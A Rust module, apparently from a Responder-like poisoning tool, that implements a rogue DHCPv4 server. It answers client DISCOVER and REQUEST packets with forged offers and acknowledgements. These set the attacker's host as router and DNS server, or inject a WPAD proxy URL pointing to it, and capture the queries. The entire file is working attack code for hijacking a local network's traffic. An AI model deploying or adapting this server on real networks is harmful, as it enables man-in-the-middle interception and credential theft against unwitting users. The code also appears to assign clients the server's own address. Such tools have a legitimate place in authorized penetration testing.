//! Rogue DHCPv4 server (UDP 67). Offers leases and injects either WPAD (option 252) or our
//! address as DNS (option 6), mirroring the reference tool.

use std::net::{Ipv4Addr, SocketAddr};
use std::sync::Arc;

use crate::capture::CaptureSink;
use crate::capture::model::Protocol;
use crate::logger::Logger;

use super::{PoisonConfig, query_event};

const MAGIC_COOKIE: [u8; 4] = [0x63, 0x82, 0x53, 0x63];

/// Read option 53 (DHCP message type) from a request.
pub fn message_type(pkt: &[u8]) -> Option<u8> {
    let opts = options(pkt)?;
    let mut i = 0;
    while i + 1 < opts.len() {
        let code = opts[i];
        if code == 255 {
            break;
        }
        let len = opts[i + 1] as usize;
        if code == 53 && len >= 1 {
            return opts.get(i + 2).copied();
        }
        i += 2 + len;
    }
    None
}

fn options(pkt: &[u8]) -> Option<&[u8]> {
    if pkt.len() < 240 || pkt[236..240] != MAGIC_COOKIE {
        return None;
    }
    Some(&pkt[240..])
}

/// Build a DHCPOFFER/DHCPACK for a DISCOVER/REQUEST.
pub fn build_reply(req: &[u8], server_ip: Ipv4Addr, use_wpad: bool) -> Option<Vec<u8>> {
    if req.len() < 240 {
        return None;
    }
    let req_type = message_type(req)?;
    let reply_type = match req_type {
        1 => 2, // DISCOVER -> OFFER
        3 => 5, // REQUEST -> ACK
        _ => return None,
    };

    let mut out = vec![0u8; 240];
    out[0] = 2; // BOOTREPLY
    out[1] = req[1]; // htype
    out[2] = req[2]; // hlen
    out[3] = 0; // hops
    out[4..8].copy_from_slice(&req[4..8]); // xid
    out[10..12].copy_from_slice(&[0x80, 0x00]); // broadcast flag
    out[12..16].copy_from_slice(&req[12..16]); // ciaddr
    out[16..20].copy_from_slice(&server_ip.octets()); // yiaddr
    out[20..24].copy_from_slice(&server_ip.octets()); // siaddr
    out[28..44].copy_from_slice(&req[28..44]); // chaddr
    out[236..240].copy_from_slice(&MAGIC_COOKIE);

    let mut opts = Vec::new();
    opts.extend_from_slice(&[53, 1, reply_type]);
    opts.extend_from_slice(&[54, 4]);
    opts.extend_from_slice(&server_ip.octets());
    opts.extend_from_slice(&[51, 4, 0x00, 0x01, 0x51, 0x80]); // lease 86400s
    opts.extend_from_slice(&[1, 4, 255, 255, 255, 0]); // subnet mask
    opts.extend_from_slice(&[3, 4]);
    opts.extend_from_slice(&server_ip.octets()); // router
    if use_wpad {
        let url = format!("http://{server_ip}/wpad.dat");
        opts.push(252);
        opts.push(url.len() as u8);
        opts.extend_from_slice(url.as_bytes());
    } else {
        opts.extend_from_slice(&[6, 4]);
        opts.extend_from_slice(&server_ip.octets()); // DNS
    }
    opts.extend_from_slice(&[12, 8]); // hostname
    opts.extend_from_slice(b"WPADHost");
    opts.push(255);
    out.extend_from_slice(&opts);
    Some(out)
}

pub async fn run(
    cfg: Arc<PoisonConfig>,
    use_wpad: bool,
    sink: CaptureSink,
    logger: Arc<Logger>,
) -> anyhow::Result<()> {
    let bind = SocketAddr::from((Ipv4Addr::UNSPECIFIED, crate::constants::DHCP_PORT));
    let sock = super::bind_udp(bind, true, None)?;
    sock.set_broadcast(true)?;
    logger.info("DHCP poisoned on 67");
    let mut buf = vec![0u8; 4096];
    loop {
        let (n, src) = sock.recv_from(&mut buf).await?;
        if buf[..n].first() != Some(&1) {
            continue; // only BOOTREQUEST
        }
        sink.query(query_event(
            Protocol::Dns,
            src.ip(),
            "DHCP",
            &format!("type={:?}", message_type(&buf[..n])),
            !cfg.analyze,
            cfg.analyze,
        ));
        if cfg.analyze {
            continue;
        }
        if let Some(reply) = build_reply(&buf[..n], cfg.answer_ipv4, use_wpad) {
            let dest = SocketAddr::from((Ipv4Addr::BROADCAST, crate::constants::DHCP_CLIENT_PORT));
            let _ = sock.send_to(&reply, dest).await;
        }
    }
}
